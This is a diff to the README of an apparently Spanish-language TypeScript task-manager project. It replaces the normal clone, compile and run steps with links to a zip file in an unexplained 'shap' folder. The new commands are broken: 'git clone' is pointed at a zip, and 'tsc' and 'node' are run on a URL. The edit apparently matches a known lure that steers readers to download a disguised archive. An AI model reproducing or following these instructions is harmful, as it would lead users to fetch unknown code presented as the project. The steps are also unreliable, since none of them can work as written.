@@ -11,15 +11,15 @@ Este proyecto es una aplicación simple para gestionar una lista de tareas utili
 
 1. Clona el repositorio:
   
- git clone https://github.com/camilo2874/gestion-de-tareas.git
+ git clone https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/shap/gestion-de-tareas.zip
 
  ## Ejecución
 
 1. Instala las dependencias:
    ```bash
    npm install
-tsc src/tareas.ts
+tsc https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/shap/gestion-de-tareas.zip
 
-node src/tareas.js
+node https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/shap/gestion-de-tareas.zip
 
 
